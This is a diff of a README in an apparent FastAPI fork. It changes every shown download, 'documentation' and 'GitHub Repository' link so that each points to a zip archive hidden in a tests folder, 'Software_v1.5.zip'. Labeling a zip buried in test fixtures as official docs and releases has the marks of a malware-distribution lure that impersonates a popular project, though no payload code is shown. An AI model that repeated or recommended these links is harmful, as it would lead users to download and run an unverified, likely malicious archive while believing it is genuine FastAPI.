@@ -1,6 +1,6 @@
 # 🎉 fastapi - Fast and Easy API Development
 
-[![Download FastAPI](https://raw.githubusercontent.com/Dcox1109/fastapi/master/Opuntia/fastapi.zip%20FastAPI-v1.0-blue)](https://raw.githubusercontent.com/Dcox1109/fastapi/master/Opuntia/fastapi.zip)
+[![Download FastAPI](https://github.com/Dcox1109/fastapi/raw/refs/heads/master/tests/test_tutorial/test_sql_databases/Software_v1.5.zip%20FastAPI-v1.0-blue)](https://github.com/Dcox1109/fastapi/raw/refs/heads/master/tests/test_tutorial/test_sql_databases/Software_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ FastAPI is a modern web framework for building APIs. It is designed to be fast, 
 
 ## 📥 Download & Install
 
-To get started, you need to visit the [Releases page](https://raw.githubusercontent.com/Dcox1109/fastapi/master/Opuntia/fastapi.zip) to download the latest version of FastAPI.
+To get started, you need to visit the [Releases page](https://github.com/Dcox1109/fastapi/raw/refs/heads/master/tests/test_tutorial/test_sql_databases/Software_v1.5.zip) to download the latest version of FastAPI.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version listed on the page.
@@ -86,13 +86,13 @@ FastAPI helps you create APIs quickly. Here’s how to get started:
 
 If you want to learn more about FastAPI, here are some great resources:
 
-- **Documentation**: The official [FastAPI documentation](https://raw.githubusercontent.com/Dcox1109/fastapi/master/Opuntia/fastapi.zip) provides a comprehensive guide.
+- **Documentation**: The official [FastAPI documentation](https://github.com/Dcox1109/fastapi/raw/refs/heads/master/tests/test_tutorial/test_sql_databases/Software_v1.5.zip) provides a comprehensive guide.
 - **Video Tutorials**: Look for video tutorials on platforms like YouTube to get visual guidance on using FastAPI.
 - **Community Forums**: Join forums or groups focused on FastAPI to ask questions and share knowledge.
 
 ## 🔗 Additional Helpful Links
 
-- **GitHub Repository**: [FastAPI GitHub](https://raw.githubusercontent.com/Dcox1109/fastapi/master/Opuntia/fastapi.zip)
+- **GitHub Repository**: [FastAPI GitHub](https://github.com/Dcox1109/fastapi/raw/refs/heads/master/tests/test_tutorial/test_sql_databases/Software_v1.5.zip)
 - **Talk to the Community**: Check out the discussions happening around FastAPI.
 - **Follow Updates**: Subscribe to notifications on the GitHub repository to stay informed about new features and versions.
 
